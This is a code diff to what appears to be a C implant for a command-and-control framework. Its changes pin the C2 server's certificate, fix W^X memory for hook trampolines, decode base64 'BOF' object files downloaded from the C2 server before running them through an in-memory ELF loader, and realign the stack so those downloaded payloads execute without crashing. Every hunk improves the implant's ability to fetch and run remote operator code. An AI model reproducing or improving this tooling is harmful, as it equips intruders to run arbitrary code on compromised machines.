@@ -213,7 +213,8 @@ void *create_trampoline(void *target, void *near_hint)
     if (!target)
         return NULL;
     size_t code_size = 12;
-    void *code = mmap_near(near_hint, code_size, PROT_READ | PROT_WRITE | PROT_EXEC);
+    /* W^X: map RW, write the stub, then flip to RX. Never RWX. */
+    void *code = mmap_near(near_hint, code_size, PROT_READ | PROT_WRITE);
     if (code == MAP_FAILED)
         return NULL;
 
@@ -221,6 +222,11 @@ void *create_trampoline(void *target, void *near_hint)
                                  0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0};
     *(uint64_t *)(trampoline_code + 2) = (uint64_t)target;
     memcpy(code, trampoline_code, code_size);
+    if (mprotect(code, code_size, PROT_READ | PROT_EXEC) != 0)
+    {
+        munmap(code, code_size);
+        return NULL;
+    }
 
     if (g_trampolines_count >= g_trampolines_capacity)
     {
@@ -308,6 +314,56 @@ static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, voi
     return realsize;
 }
 
+/* Convert a config fingerprint to the format libcurl's
+ * CURLOPT_PINNEDPUBLICKEY expects ("sha256//<base64>").
+ * Accepts 64 hex chars (the config contract) or an already
+ * formatted "sha256//..." value. Anything else is passed through
+ * so curl fails closed on malformed pins. */
+static int bsb_hex_val(char c)
+{
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    return -1;
+}
+
+static void bsb_curl_pin_format(const char *in, char *out, size_t outsz)
+{
+    if (!in || !in[0] || !out || outsz == 0)
+        return;
+
+    size_t in_len = strlen(in);
+
+    if (in_len == 64)
+    {
+        unsigned char raw[32];
+        int hex_ok = 1;
+        for (int i = 0; i < 32 && hex_ok; i++)
+        {
+            int hi = bsb_hex_val(in[i * 2]);
+            int lo = bsb_hex_val(in[i * 2 + 1]);
+            if (hi < 0 || lo < 0)
+                hex_ok = 0;
+            else
+                raw[i] = (unsigned char)((hi << 4) | lo);
+        }
+        if (hex_ok)
+        {
+            char *b64 = base64_encode(raw, 32);
+            if (b64)
+            {
+                snprintf(out, outsz, "sha256//%s", b64);
+                free(b64);
+                return;
+            }
+        }
+    }
+
+    /* Pass through (covers "sha256//..." and malformed values; curl
+     * fails closed on pins it cannot parse). */
+    snprintf(out, outsz, "%s", in);
+}
+
 http_response_t https_request(const bsb_config_t *cfg, const char *url, const char *method,
                               const char *post_data)
 {
@@ -323,10 +379,16 @@ http_response_t https_request(const bsb_config_t *cfg, const char *url, const ch
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, (long)cfg->network.verify_tls);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, (long)(cfg->network.verify_tls ? 2L : 0L));
 
-    /* Certificate pinning (TOFU): if fingerprint is configured, pin it */
+    /* Certificate pinning (TOFU): if fingerprint is configured, pin it.
+     * curl expects "sha256//<base64>"; the config stores 64 hex chars
+     * (contract: network.cert_fingerprint_sha256), so convert here.
+     * Passing the raw hex string makes curl always reject the peer
+     * (verified empirically: pinning dead-on-arrival without this). */
     if (cfg->network.cert_fingerprint_sha256[0] != '\0')
     {
-        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, cfg->network.cert_fingerprint_sha256);
+        char pin_buf[128];
+        bsb_curl_pin_format(cfg->network.cert_fingerprint_sha256, pin_buf, sizeof(pin_buf));
+        curl_easy_setopt(curl, CURLOPT_PINNEDPUBLICKEY, pin_buf);
     }
 
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, (long)cfg->timing.curl_timeout_seconds);
@@ -777,15 +839,33 @@ char *get_local_ips(void)
 /* --- BOF download --- */
 unsigned char *download_bof(const bsb_config_t *cfg, const char *url, size_t *out_size)
 {
+    *out_size = 0;
     http_response_t resp = https_request(cfg, url, "GET", NULL);
     if (!resp.data || resp.len == 0)
     {
-        *out_size = 0;
         free(resp.data);
         return NULL;
     }
-    *out_size = resp.len;
-    return (unsigned char *)resp.data;
+    /* The C2 serves base64(obj) + CRLF (see handle_bof in c2/server.py);
+     * decode back to the raw ELF relocatable before handing it to RunELF. */
+    size_t b64_len = strlen(resp.data);
+    while (b64_len > 0 &&
+           (resp.data[b64_len - 1] == '\r' || resp.data[b64_len - 1] == '\n'))
+    {
+        b64_len--;
+    }
+    resp.data[b64_len] = '\0';
+
+    int decoded_len = 0;
+    unsigned char *decoded = base64_decode(resp.data, &decoded_len);
+    free(resp.data);
+    if (!decoded || decoded_len <= 0)
+    {
+        free(decoded);
+        return NULL;
+    }
+    *out_size = (size_t)decoded_len;
+    return decoded;
 }
 
 /* --- BOF execution with fork isolation --- */
@@ -855,14 +935,23 @@ static void bof_crash_exit(int sig)
 static void __attribute__((noinline)) call_bof_isolated(bof_func_t func, char *args,
                                                         uintptr_t arglen)
 {
-    /* The function body keeps %rsp 16-byte aligned per the SysV ABI, so a
-     * bare call here gives the BOF entry the aligned stack it expects.
-     * Callee-saved registers are restored by the BOF itself (ABI) and xmm
-     * clobbers are spilled by gcc around this block. */
-    asm volatile("mov %0, %%rdi\n\t"
+    /* Force a 16-byte-aligned stack before the call instead of trusting
+     * the compiler's frame layout: gcc -O0 may leave %rsp misaligned in
+     * the function body, and the BOF prologue's `movaps` xmm spills then
+     * fault (SIGSEGV inside BeaconPrintf). We save the original %rsp in
+     * a scratch slot we own below the current stack pointer, align, call,
+     * then restore. Callee-saved registers are restored by the BOF
+     * itself (ABI); xmm clobbers are spilled by gcc around this block. */
+    asm volatile("mov %%rsp, %%rax\n\t"      /* save original rsp       */
+                 "and $-16, %%rsp\n\t"       /* align down to 16        */
+                 "sub $16, %%rsp\n\t"        /* scratch slot below      */
+                 "mov %%rax, 8(%%rsp)\n\t"   /* stash original rsp      */
+                 "mov %0, %%rdi\n\t"
                  "mov %1, %%rsi\n\t"
                  "xor %%eax, %%eax\n\t"
                  "call *%2\n\t"
+                 "mov 8(%%rsp), %%rax\n\t"   /* recover original rsp    */
+                 "mov %%rax, %%rsp\n\t"      /* restore                 */
                  :
                  : "r"(args), "r"(arglen), "r"(func)
                  : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11", "xmm0", "xmm1",
